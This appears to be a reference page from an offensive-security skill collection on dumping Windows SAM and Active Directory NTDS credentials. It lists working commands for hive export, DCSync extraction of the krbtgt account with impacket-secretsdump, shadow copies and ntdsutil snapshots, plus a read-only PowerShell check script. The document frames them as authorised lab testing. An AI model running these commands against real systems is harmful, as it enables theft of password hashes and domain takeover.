# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`credential-dumping-sam-and-ntds`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `reg save` | `reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y` | Hive export | Windows |
| `impacket-secretsdump` | `impacket-secretsdump -just-dc-user krbtgt corp.example/lowpriv:pass@dc01` | Replication-based extraction, lab only | Linux / Windows |
| `vssadmin` | `vssadmin create shadow /for=C:` | Shadow copy for NTDS.dit access | Windows |
| `ntdsutil` | `ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ifm" q q` | Install-from-media snapshot of NTDS | Windows |
| `Get-Acl` | `Get-Acl "AD:$((Get-ADDomain).DistinguishedName)"` | Replication ACE holders | Windows |

## Minimal Lab Validation Script

Report the access precondition for each database; exporting any of them is a separate authorised step with evidence handling.

```python
import subprocess

def ps(cmd):
    return subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                          capture_output=True, text=True).stdout.strip()

print("cached_logons", ps("(Get-ItemProperty "
                          "'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' "
                          "-ErrorAction SilentlyContinue).CachedLogonsCount"))
print("sam_acl", ps("(icacls C:\\Windows\\System32\\config\\SAM) -join ' '")[:200])
print("replication_aces", ps(
    "(Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access | "
    "Where-Object { $_.ObjectType -eq [guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' } | "
    "Select-Object -ExpandProperty IdentityReference"))
```

## Flag Notes

- `-just-dc-user` limits extraction to one account, which is the smallest possible proof.
- `/for=C:` scopes the shadow copy to the system volume rather than the whole host.
- `create full` produces a snapshot including NTDS.dit and the registry hives for offline parsing.
